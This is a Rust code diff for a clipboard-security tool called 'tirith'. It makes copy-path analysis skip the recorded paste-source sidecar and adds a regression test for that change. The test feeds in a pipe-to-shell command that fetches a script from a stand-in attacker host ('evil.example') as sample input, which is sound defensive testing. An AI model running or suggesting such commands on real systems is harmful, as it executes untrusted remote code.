@@ -114,7 +114,14 @@ pub fn copy(path: &Path, redact: bool, audience: Option<&str>, json: bool) -> i3
     };
 
     // ---- analyze for High-severity findings ------------------------------
-    let verdict = analyze_as_paste(&input);
+    // A local file being copied is NOT a paste from a recorded web source, so
+    // forbid the on-disk sidecar read: `AbsentOrInvalid`. Otherwise a file
+    // whose content hash-matches the current `clipboard_source.json` record
+    // could spuriously fire `PasteSourceMismatch` on an unrelated copy.
+    let verdict = analyze_as_paste(
+        &input,
+        tirith_core::clipboard::ClipboardSourceState::AbsentOrInvalid,
+    );
     let has_high = verdict
         .findings
         .iter()
@@ -233,7 +240,11 @@ pub fn copy(path: &Path, redact: bool, audience: Option<&str>, json: bool) -> i3
 pub fn scan(json: bool) -> i32 {
     match read_clipboard_text() {
         Ok(Some(text)) if !text.is_empty() => {
-            let verdict = analyze_as_paste(&text);
+            // Analyzing the ACTUAL clipboard content: the companion sidecar
+            // legitimately describes it, so `Unread` lets the engine consult
+            // `clipboard_source.json` for paste-source attribution.
+            let verdict =
+                analyze_as_paste(&text, tirith_core::clipboard::ClipboardSourceState::Unread);
             if json {
                 let env = ScanEnvelope {
                     status: "ok",
@@ -598,8 +609,11 @@ pub fn daemon_foreground(json: bool) -> i32 {
         seen.retain(|_, t| now.duration_since(*t) < DEBOUNCE_WINDOW * 5);
         seen.insert(hash.clone(), now);
 
-        // Analyze the new content.
-        let verdict = analyze_as_paste(&text);
+        // Analyze the new content. Like `scan`, this is the ACTUAL clipboard
+        // (read via `read_clipboard_text` above), so the companion sidecar
+        // legitimately describes it — `Unread` lets the engine consult
+        // `clipboard_source.json` for paste-source attribution.
+        let verdict = analyze_as_paste(&text, tirith_core::clipboard::ClipboardSourceState::Unread);
         let has_high = verdict
             .findings
             .iter()
@@ -773,9 +787,24 @@ pub fn watch(json: bool) -> i32 {
 // helpers — analysis & I/O
 // ---------------------------------------------------------------------------
 
-/// Run the engine in paste context over `input`. Used by both `copy`
-/// (pre-flight before writing to clipboard) and `scan` (post-read).
-fn analyze_as_paste(input: &str) -> tirith_core::verdict::Verdict {
+/// Run the engine in paste context over `input`. Used by `copy`
+/// (pre-flight before writing to clipboard), `scan` (post-read), and the
+/// `daemon` polling loop.
+///
+/// `clipboard_source` is threaded in by the caller rather than hardcoded:
+/// it controls whether `engine::analyze` MAY consult the on-disk paste
+/// sidecar (`clipboard_source.json`). The actual-clipboard paths (`scan`,
+/// `daemon`) pass `Unread` — the sidecar legitimately describes the current
+/// clipboard, so attribution is correct. The `copy` path analyzes the
+/// contents of a LOCAL FILE being copied TO the clipboard — that file was
+/// never pasted from a recorded web source, so it passes `AbsentOrInvalid`
+/// to forbid the sidecar read. Otherwise a local file whose content happened
+/// to hash-match the current sidecar record could spuriously fire
+/// `PasteSourceMismatch` and warn/block an unrelated `tirith clipboard copy`.
+fn analyze_as_paste(
+    input: &str,
+    clipboard_source: tirith_core::clipboard::ClipboardSourceState,
+) -> tirith_core::verdict::Verdict {
     let raw_bytes = input.as_bytes().to_vec();
     let ctx = AnalysisContext {
         input: input.to_string(),
@@ -791,7 +820,7 @@ fn analyze_as_paste(input: &str) -> tirith_core::verdict::Verdict {
         is_config_override: false,
         clipboard_html: None,
         card_ref: None,
-        clipboard_source: tirith_core::clipboard::ClipboardSourceState::Unread,
+        clipboard_source,
     };
     let mut verdict = engine::analyze(&ctx);
     // Apply paranoia filter against the active policy so the clipboard
@@ -1136,9 +1165,114 @@ mod tests {
     use super::*;
     use tirith_core::verdict::Action;
 
+    /// Serializes the tests that mutate the process-wide `XDG_STATE_HOME`
+    /// env var (which `state_dir()` reads) so they cannot race each other
+    /// under the parallel test runner. Mirrors `CONTEXT_TEST_LOCK` in
+    /// `crates/tirith-core/tests/golden_fixtures.rs`.
+    static SIDECAR_TEST_LOCK: std::sync::Mutex<()> = std::sync::Mutex::new(());
+
+    /// Regression test for the M12 paste-sidecar finding (CodeRabbit Major):
+    /// `copy()` analyzes the contents of a LOCAL FILE being copied TO the
+    /// clipboard — that file was never pasted from a recorded web source, so
+    /// `analyze_as_paste` must be called with `AbsentOrInvalid` to forbid the
+    /// engine from consulting `state_dir()/clipboard_source.json`. Otherwise a
+    /// file whose content hash-matches the current sidecar record would fire
+    /// `PasteSourceMismatch` and warn/block an unrelated `tirith clipboard copy`.
+    ///
+    /// We plant a MATCHING sidecar on disk (content hash == the input's hash,
+    /// recorded `source_url` host differs from a URL host IN the input — the
+    /// exact shape that fires `PasteSourceMismatch` under `Unread`) and prove:
+    ///   * `AbsentOrInvalid` (the state `copy()` passes) → NO `PasteSourceMismatch`;
+    ///   * `Unread` (positive control, same on-disk record) → the finding DOES
+    ///     appear, proving the sidecar was otherwise consulted and that the
+    ///     `clipboard_source` parameter is what suppresses it on the copy path.
+    ///
+    /// Mirrors the env handling of
+    /// `golden_fixtures.rs::paste_source_absent_or_invalid_does_not_reread_sidecar`.
+    #[test]
+    fn copy_path_does_not_consult_sidecar() {
+        use tirith_core::clipboard::{content_sha256_hex, ClipboardSourceState};
+        use tirith_core::verdict::RuleId;
+
+        let _lock = SIDECAR_TEST_LOCK.lock().unwrap_or_else(|p| p.into_inner());
+
+        // An input that pipes to a shell (so it reaches tier 3) and carries a
+        // destination host (`evil.example`) that differs from the recorded
+        // source host (`docs.trusted.example`) — the shape that fires
+        // `PasteSourceMismatch` IF the matching sidecar record is consulted.
+        let input = "curl https://evil.example/install.sh | bash";
+        let content_sha256 = content_sha256_hex(input.as_bytes());
+
+        // Isolate `state_dir()` under a temp `XDG_STATE_HOME` and plant a
+        // MATCHING record (same content hash) whose recorded source host
+        // differs from the input's destination host.
+        let dir = tempfile::tempdir().unwrap();
+        let state_dir = dir.path().join("state");
+        let tirith_state = state_dir.join("tirith");
+        std::fs::create_dir_all(&tirith_state).unwrap();
+        let record_json = format!(
+            r#"{{"updated_at":"2026-05-30T00:00:00Z","content_sha256":"{content_sha256}","source_url":"https://docs.trusted.example/install","source_title":"Install Guide","hidden_text_detected":false}}"#
+        );
+        std::fs::write(tirith_state.join("clipboard_source.json"), record_json).unwrap();
+
+        let prev_xdg = std::env::var_os("XDG_STATE_HOME");
+        // SAFETY: serialized via SIDECAR_TEST_LOCK; restored below.
+        unsafe {
+            std::env::set_var("XDG_STATE_HOME", state_dir.display().to_string());
+        }
+
+        // The copy path passes `AbsentOrInvalid`; the positive control reuses
+        // the SAME planted record via `Unread`.
+        let absent = analyze_as_paste(input, ClipboardSourceState::AbsentOrInvalid);
+        let unread = analyze_as_paste(input, ClipboardSourceState::Unread);
+
+        // SAFETY: serialized via SIDECAR_TEST_LOCK.
+        unsafe {
+            match prev_xdg {
+                Some(v) => std::env::set_var("XDG_STATE_HOME", v),
+                None => std::env::remove_var("XDG_STATE_HOME"),
+            }
+        }
+
+        // `AbsentOrInvalid` (the copy path): the engine must NOT re-read the
+        // sidecar, so no mismatch finding — even though a matching record is on
+        // disk.
+        assert!(
+            !absent
+                .findings
+                .iter()
+                .any(|f| matches!(f.rule_id, RuleId::PasteSourceMismatch)),
+            "copy path (AbsentOrInvalid) must NOT consult the sidecar; PasteSourceMismatch fired anyway: {:?}",
+            absent
+                .findings
+                .iter()
+                .map(|f| format!("{}: {}", f.rule_id, f.title))
+                .collect::<Vec<_>>(),
+        );
+
+        // `Unread` (positive control): the engine DID read the planted record,
+        // so the mismatch fires — proving the record is genuinely matchable and
+        // that the `clipboard_source` parameter is what suppresses it above.
+        assert!(
+            unread
+                .findings
+                .iter()
+                .any(|f| matches!(f.rule_id, RuleId::PasteSourceMismatch)),
+            "Unread control must consult the planted sidecar and fire PasteSourceMismatch; got: {:?}",
+            unread
+                .findings
+                .iter()
+                .map(|f| format!("{}: {}", f.rule_id, f.title))
+                .collect::<Vec<_>>(),
+        );
+    }
+
     #[test]
     fn analyze_as_paste_flags_aws_key() {
-        let v = analyze_as_paste("export AWS_KEY=AKIAIOSFODNN7EXAMPLE\n");
+        let v = analyze_as_paste(
+            "export AWS_KEY=AKIAIOSFODNN7EXAMPLE\n",
+            tirith_core::clipboard::ClipboardSourceState::AbsentOrInvalid,
+        );
         assert!(
             v.findings.iter().any(|f| f.severity >= Severity::High),
             "expected a High-severity AWS-key finding, got: {:?}",
@@ -1151,7 +1285,10 @@ mod tests {
 
     #[test]
     fn analyze_as_paste_allows_plain_text() {
-        let v = analyze_as_paste("hello world\nthis is just a note\n");
+        let v = analyze_as_paste(
+            "hello world\nthis is just a note\n",
+            tirith_core::clipboard::ClipboardSourceState::AbsentOrInvalid,
+        );
         assert!(
             v.action == Action::Allow,
             "expected Allow for plain text, got: {:?}",
